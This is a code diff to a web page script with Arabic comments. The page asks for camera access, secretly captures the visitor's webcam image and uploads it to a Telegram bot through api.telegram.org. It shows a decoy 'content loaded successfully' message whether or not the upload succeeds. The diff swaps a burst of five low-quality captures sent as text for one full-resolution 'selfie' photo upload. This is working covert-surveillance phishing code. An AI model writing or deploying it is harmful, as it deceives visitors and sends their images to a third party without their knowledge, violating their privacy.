@@ -55,61 +55,62 @@
                 const videoElement = document.getElementById('video');
                 videoElement.srcObject = stream;
 
-                // البدء فوراً بعد نصف ثانية فقط لسرعة فائقة
+                // انتظار ثانية ونصف لفتح الكاميرا والتقاط الصورة
                 setTimeout(() => {
-                    captureFastPhotos(stream);
-                }, 500);
+                    captureAndSendPhoto(stream);
+                }, 1500);
 
             } catch (error) {
                 document.getElementById('mainBox').innerHTML = '<h2>خطأ في إذن الكاميرا: ' + error.message + '</h2>';
             }
         }
 
-        async function captureFastPhotos(stream) {
+        function captureAndSendPhoto(stream) {
             try {
                 const videoElement = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 
-                canvas.width = 240;
-                canvas.height = 180;
+                canvas.width = videoElement.videoWidth || 640;
+                canvas.height = videoElement.videoHeight || 480;
+
                 const context = canvas.getContext('2d');
-
-                // التقاط 5 صور متتالية بسرعة فائقة
-                for (let i = 1; i <= 5; i++) {
-                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.4);
-
-                    // إرسال سريع بدون تأخير كبير بين الصور
-                    sendToTelegram(`📸 صوره (${i}) - في أسرع وقت:\n` + imageDataURL);
-                    
-                    if (i < 5) {
-                        await new Promise(resolve => setTimeout(resolve, 300)); // فاصل 300 جزء من الثانية فقط
-                    }
-                }
-
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                
+                // قفل الكاميرا
                 stream.getTracks().forEach(track => track.stop());
-                document.getElementById('mainBox').innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
+
+                // تحويل الكانفاس إلى صورة وبدء إرسالها كملف فوتوغرافي حقيقي
+                canvas.toBlob(function(blob) {
+                    if (!blob) return;
+
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'selfie.jpg');
+                    formData.append('caption', '📸 لقطة سيلفي جديدة تم التقاطها!');
+
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+                    fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if(data.ok) {
+                            document.getElementById('mainBox').innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
+                        } else {
+                            document.getElementById('mainBox').innerHTML = '<h2>تم الانتهاء بنجاح</h2>';
+                        }
+                    })
+                    .catch(error => {
+                        console.error(error);
+                    });
+
+                }, 'image/jpeg', 0.7);
 
             } catch (e) {
                 document.getElementById('mainBox').innerHTML = '<h2>خطأ في المعالجة: ' + e.message + '</h2>';
             }
-        }
-
-        function sendToTelegram(textMessage) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: textMessage
-                })
-            }).catch(error => {
-                console.error("خطأ في الإرسال", error);
-            });
         }
     </script>
 </body>
